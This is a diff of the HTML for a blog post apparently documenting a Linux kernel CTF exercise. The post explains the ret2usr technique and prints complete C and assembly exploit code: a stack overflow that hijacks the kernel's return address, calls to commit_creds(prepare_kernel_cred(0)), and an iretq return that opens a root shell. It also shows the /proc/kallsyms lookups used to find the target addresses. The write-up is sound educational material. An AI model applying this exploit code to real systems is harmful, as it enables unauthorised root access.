-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
-</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">escalate_privs</span><span class="p">;</span> <span class="c1">// ret
-</span><span class="c1"></span>
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload&#34;</span><span class="p">);</span>
-    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
-
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><p>The final concern here is what do we actually write in that function to achieve root privileges.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">escalate_privs</span><span class="p">;</span> <span class="c1">// ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The final concern here is what do we actually write in that function to achieve root privileges.</p>
 <h3 id="getting-root-privileges">Getting root privileges</h3>
 <p>Again, just as a reminder, our goal in kernel exploitation is not to pop a shell via <code>system(&quot;/bin/sh&quot;)</code> or <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>, but it is to achieve root privileges in the system, then pop a root shell. Typically, the most common way to do this is by using the 2 functions called <code>commit_creds()</code> and <code>prepare_kernel_cred()</code>, which are functions that already reside in the kernel-space code itself. What we need to do is to call the 2 functions like this:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
-</code></pre></div><p>Since <code>KASLR</code> is disabled, the addresses where these functions reside in is constant across every boot. Therefore, we can just easily get those addresses by reading <code>/proc/kallsyms</code> file using these shell commands:</p>
-<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">cat /proc/kallsyms <span class="p">|</span> grep commit_creds
--&gt; ffffffff814c6410 T commit_creds
-cat /proc/kallsyms <span class="p">|</span> grep prepare_kernel_cred
--&gt; ffffffff814c67f0 T prepare_kernel_cred
-</code></pre></div><p>Then the code to achieve root privileges can be written as follows (you can write it in many different ways, it&rsquo;s just simply calling 2 functions consecutively using one&rsquo;s return value as the other&rsquo;s parameter, I just saw this in a writeup and copied it):</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="n">__asm__</span><span class="p">(</span>
-        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
-        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
-</span><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
-	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
-	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
-</span><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
-        <span class="p">...</span>
-        <span class="s">&#34;.att_syntax;&#34;</span>
-    <span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><div class="details admonition tip open">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+</span></span></code></pre></div><p>Since <code>KASLR</code> is disabled, the addresses where these functions reside in is constant across every boot. Therefore, we can just easily get those addresses by reading <code>/proc/kallsyms</code> file using these shell commands:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /proc/kallsyms <span class="p">|</span> grep commit_creds
+</span></span><span class="line"><span class="cl">-&gt; ffffffff814c6410 T commit_creds
+</span></span><span class="line"><span class="cl">cat /proc/kallsyms <span class="p">|</span> grep prepare_kernel_cred
+</span></span><span class="line"><span class="cl">-&gt; ffffffff814c67f0 T prepare_kernel_cred
+</span></span></code></pre></div><p>Then the code to achieve root privileges can be written as follows (you can write it in many different ways, it&rsquo;s just simply calling 2 functions consecutively using one&rsquo;s return value as the other&rsquo;s parameter, I just saw this in a writeup and copied it):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
+</span></span><span class="line"><span class="cl">	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
+</span></span><span class="line"><span class="cl">	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">...</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;.att_syntax;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div class="details admonition tip open">
         <div class="details-summary admonition-title">
             <i class="icon fas fa-lightbulb fa-fw"></i>Tip<i class="details-icon fas fa-angle-right fa-fw"></i>
         </div>
@@ -375,54 +375,54 @@ cat /proc/kallsyms <span class="p">|</span> grep prepare_kernel_cred
 <p>At the current state of the exploitation, if you simply return to a <code>userland</code> piece of code to pop a shell, you will be disappointed. The reason is because after running the above code, we are still executing in <code>kernel-mode</code>. In order to open a root shell, we have to return to <code>user-mode</code>.</p>
 <p>Basically, if the kernel runs normally, it will return to userland using 1 of these instructions (in x86_64): <code>sysretq</code> or <code>iretq</code>. The typical way that most people use is through <code>iretq</code>, because as far as I know, <code>sysretq</code> is more complicated to get right. The <code>iretq</code> instruction just requires the stack to be setup with <strong>5 userland register values</strong> in this order: <code>RIP|CS|RFLAGS|SP|SS</code>.</p>
 <p>The process keeps track of 2 different sets of values for these registers, one for <code>user-mode</code> and one for <code>kernel-mode</code>. Therefore, after finishing executing in <code>kernel-mode</code>, it must revert back to the <code>user-mode</code> values for these registers. For <code>RIP</code>, we can simply set this to be the address of the function that pops a shell. However, for the other registers, if we just set them to be something random, the process may not continue execution as expected. To solve this problem, people have thought of a very clever way: <em>save the state of these registers before going into kernel-mode, then reload them after gaining root privileges</em>. The function to save their states is as follow:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">save_state</span><span class="p">(){</span>
-    <span class="n">__asm__</span><span class="p">(</span>
-        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
-        <span class="s">&#34;mov user_cs, cs;&#34;</span>
-        <span class="s">&#34;mov user_ss, ss;&#34;</span>
-        <span class="s">&#34;mov user_sp, rsp;&#34;</span>
-        <span class="s">&#34;pushf;&#34;</span>
-        <span class="s">&#34;pop user_rflags;&#34;</span>
-        <span class="s">&#34;.att_syntax;&#34;</span>
-    <span class="p">);</span>
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Saved state&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><p>And one more thing, on x86_64, one more instruction called <code>swapgs</code> must be called before <code>iretq</code>. The purpose of this instruction is to also swap the <code>GS</code> register between <code>kernel-mode</code> and <code>user-mode</code>. With all those information, we can finish the code to gain root privileges, then return to <code>user-mode</code>:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>
-
-<span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
-    <span class="n">__asm__</span><span class="p">(</span>
-        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
-        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
-</span><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
-	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
-	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
-</span><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
-        <span class="s">&#34;swapgs;&#34;</span>
-        <span class="s">&#34;mov r15, user_ss;&#34;</span>
-        <span class="s">&#34;push r15;&#34;</span>
-        <span class="s">&#34;mov r15, user_sp;&#34;</span>
-        <span class="s">&#34;push r15;&#34;</span>
-        <span class="s">&#34;mov r15, user_rflags;&#34;</span>
-        <span class="s">&#34;push r15;&#34;</span>
-        <span class="s">&#34;mov r15, user_cs;&#34;</span>
-        <span class="s">&#34;push r15;&#34;</span>
-        <span class="s">&#34;mov r15, user_rip;&#34;</span>
-        <span class="s">&#34;push r15;&#34;</span>
-        <span class="s">&#34;iretq;&#34;</span>
-        <span class="s">&#34;.att_syntax;&#34;</span>
-    <span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div><p>We can finally call those pieces that we have crafted one by one, in the correct order, to open a root shell:</p>
-<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-    <span class="n">save_state</span><span class="p">();</span>
-    <span class="n">open_dev</span><span class="p">();</span>
-    <span class="n">leak</span><span class="p">();</span>
-    <span class="n">overflow</span><span class="p">();</span>  
-    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div><h2 id="conclusion">Conclusion</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">save_state</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov user_cs, cs;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov user_ss, ss;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov user_sp, rsp;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;pushf;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;pop user_rflags;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;.att_syntax;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Saved state&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>And one more thing, on x86_64, one more instruction called <code>swapgs</code> must be called before <code>iretq</code>. The purpose of this instruction is to also swap the <code>GS</code> register between <code>kernel-mode</code> and <code>user-mode</code>. With all those information, we can finish the code to gain root privileges, then return to <code>user-mode</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_shell</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">escalate_privs</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__asm__</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;.intel_syntax noprefix;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;movabs rax, 0xffffffff814c67f0;&#34;</span> <span class="c1">//prepare_kernel_cred
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="s">&#34;xor rdi, rdi;&#34;</span>
+</span></span><span class="line"><span class="cl">	    <span class="s">&#34;call rax; mov rdi, rax;&#34;</span>
+</span></span><span class="line"><span class="cl">	    <span class="s">&#34;movabs rax, 0xffffffff814c6410;&#34;</span> <span class="c1">//commit_creds
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	    <span class="s">&#34;call rax;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;swapgs;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, user_ss;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;push r15;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, user_sp;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;push r15;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, user_rflags;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;push r15;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, user_cs;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;push r15;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;mov r15, user_rip;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;push r15;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;iretq;&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;.att_syntax;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>We can finally call those pieces that we have crafted one by one, in the correct order, to open a root shell:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">save_state</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">open_dev</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leak</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">overflow</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
 <p>So that concludes my first post on my Linux kernel exploitation learning process. In this post, I have demonstrated the way to setup the environment for a Linux kernel pwn challenge, and also the simplest technique in kernel exploitation: <code>ret2usr</code>.</p>
 <p>In the next post, I will gradually increase the difficulty by adding more and more mitigations, and show you the corresponding technique to bypass them.</p>
 <h2 id="appendix">Appendix</h2>
@@ -457,7 +457,7 @@ cat /proc/kallsyms <span class="p">|</span> grep prepare_kernel_cred
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.83.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.99.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
         </div>
     </footer></div>
